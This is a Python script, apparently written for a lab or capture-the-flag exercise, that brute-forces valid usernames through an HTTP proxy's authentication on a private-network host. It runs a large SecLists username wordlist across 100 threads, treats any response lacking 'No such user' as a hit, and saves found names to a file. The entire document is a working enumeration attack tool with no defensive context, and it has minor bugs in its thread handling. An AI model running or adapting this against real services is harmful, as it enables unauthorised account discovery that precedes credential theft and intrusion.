import requests,re, threading, time

max_threads = 100
sema = threading.Semaphore(value=max_threads)
threads = list()
thread_number = 0
lock = threading.Lock()
found_users_file = "found_users.txt"
wordlist = '/usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames-dup.txt'
#wordlist = 'wordlist'

def start_job():
	with open(wordlist) as f:
		lines = f.read().splitlines()
		total_req_number = len(lines)
		req_number = 0
		for l in lines:
			while True:
				if(len(threads) >= max_threads):
					clean_threads(False)

				if(len(threads) < max_threads):
					thread = threading.Thread(target=check,args=(l,req_number, total_req_number))
					threads.append(thread)
					thread.start()
					req_number = req_number + 1
					break

				time.sleep(0.2)



def clean_threads(force):
	for t in threads:
		if force == False:
			if not t.is_alive():
				t.join()#threads.remove(t)
				threads.remove(t)
				#t.join()
		else:
			t.join
			threads.remove(t)

	return True


def check(word,req_number,total_req_number):
	proxy = {'http' : f'http://{word}:password@192.168.175.224:3128'}
	r = requests.get('http://127.0.0.1:8000',proxies=proxy)
	if "No%20such%20user" not in r.text:
		with lock:
			clean_threads(True)
			print("Found user:")
			print(word)
			with open(found_users_file, "a") as f:
				f.write(f"{word}\n")
			with open("debug.txt", "a") as f:
				f.write(f"{r.text}\n")
	else:
		print(f"{req_number} of {total_req_number} ",end="\r")

start_job()